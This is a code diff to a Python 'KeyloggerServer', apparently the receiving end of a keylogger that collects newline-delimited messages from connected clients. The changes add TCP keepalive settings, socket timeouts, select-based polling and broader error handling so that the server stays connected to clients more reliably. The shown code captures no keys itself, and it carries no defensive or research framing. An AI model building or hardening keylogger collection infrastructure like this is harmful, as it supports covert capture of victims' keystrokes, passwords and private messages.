@@ -11,6 +11,7 @@ import time
 from datetime import datetime
 import sqlite3
 import os
+import select
 
 class KeyloggerServer:
     def __init__(self, host='127.0.0.1', port=65432):
@@ -141,37 +142,65 @@ class KeyloggerServer:
         """Handle individual client connection"""
         print(f"Client connected: {client_address}")
         
+        # Set socket options for better connection handling
+        client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
+        client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
+        client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
+        
+        # Set timeout for receive operations
+        client_socket.settimeout(30.0)  # 30 second timeout
+        
         try:
             buffer = ""
             while self.running:
-                data = client_socket.recv(4096)
-                if not data:
+                try:
+                    # Use select to check if data is available
+                    ready = select.select([client_socket], [], [], 1.0)[0]
+                    if not ready:
+                        continue
+                    
+                    data = client_socket.recv(4096)
+                    if not data:
+                        print(f"Client {client_address} disconnected (no data)")
+                        break
+                    
+                    buffer += data.decode('utf-8', errors='ignore')
+                    
+                    # Process complete messages (separated by newlines)
+                    while '\n' in buffer:
+                        message, buffer = buffer.split('\n', 1)
+                        if message.strip():
+                            self.process_message(message)
+                            
+                except socket.timeout:
+                    # Timeout is normal, continue
+                    continue
+                except socket.error as e:
+                    print(f"Socket error for client {client_address}: {e}")
                     break
-                
-                buffer += data.decode('utf-8', errors='ignore')
-                
-                # Process complete messages (separated by newlines)
-                while '\n' in buffer:
-                    message, buffer = buffer.split('\n', 1)
-                    if message.strip():
-                        self.process_message(message)
-                        
+                    
         except Exception as e:
             print(f"Error handling client {client_address}: {e}")
         finally:
             print(f"Client disconnected: {client_address}")
             if client_socket in self.clients:
                 self.clients.remove(client_socket)
-            client_socket.close()
+            try:
+                client_socket.close()
+            except:
+                pass
     
     def start(self):
         """Start the server"""
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
         
         try:
             self.server_socket.bind((self.host, self.port))
             self.server_socket.listen(5)
+            self.server_socket.settimeout(1.0)  # 1 second timeout for accept
             self.running = True
             
             print(f"Keylogger server started on {self.host}:{self.port}")
@@ -190,10 +219,16 @@ class KeyloggerServer:
                     client_thread.daemon = True
                     client_thread.start()
                     
+                except socket.timeout:
+                    # Timeout is normal, continue
+                    continue
                 except KeyboardInterrupt:
                     print("\nShutting down server...")
                     self.running = False
                     break
+                except Exception as e:
+                    print(f"Accept error: {e}")
+                    continue
                     
         except Exception as e:
             print(f"Server error: {e}")
